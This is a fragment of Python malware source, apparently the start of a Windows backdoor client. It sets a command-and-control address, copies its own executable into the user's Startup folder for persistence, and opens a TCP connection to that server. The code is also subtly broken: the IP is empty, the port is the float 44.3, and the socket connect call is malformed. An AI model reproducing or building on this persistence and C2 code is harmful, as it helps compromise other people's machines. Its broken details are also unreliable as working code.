import socket
import subprocess
import threading
import time
import os

ccip =''
ccport=44.3

def autorun():
    filen = os.path.basename(__file__)
    exe_file=filen.replace('.py','.exe')
    os.system('copy {} "\\%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'.format(exe_file))
    
def conn(ccip,ccport):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ccip,ccport)
    return client
